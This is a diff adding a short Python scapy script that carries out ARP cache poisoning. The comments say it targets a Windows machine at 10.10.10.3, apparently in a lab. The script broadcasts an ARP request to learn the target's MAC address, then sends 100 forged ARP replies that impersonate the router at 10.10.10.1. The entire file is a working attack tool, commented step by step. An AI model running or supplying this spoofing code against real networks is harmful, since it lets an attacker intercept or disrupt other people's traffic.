@@ -1,0 +1,29 @@
+#!/usr/bin/python3
+from scapy.all import * 
+
+# first, we are going to find the MAC address of the target windows machine for the attack by sending an Arp Request packet via broadcast to the entire network:
+
+broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff" )  #creates a broadcast packet, scapy will automatically set the kali as the source MAC address
+
+arp_layer = ARP(pdst = '10.10.10.3')  #add ARP layer aimed at windows IP , asks "who has --?" 
+
+arp_brdcst =  broadcast/arp_layer # places everything in a single packet 
+
+print("sending arp brdcst...")
+
+
+# sending packet on the network!! 
+
+answer = srp(arp_brdcst, timeout = 2, verbose = True)[0]  #store the MAC address  by selecting the first element in list  
+
+# store the MAC address 
+target_mac = answer[0][1].hwsrc
+
+packet = ARP(op =2, hwdst = target_mac, pdst ='10.10.10.3', psrc= '10.10.10.1') #create an ARP response packet, pretending to be the router (10.10.10.1)
+
+
+#send 100 packets! 
+
+send(packet, verbose = False, count = 100)
+
+print("sending 100 packets")
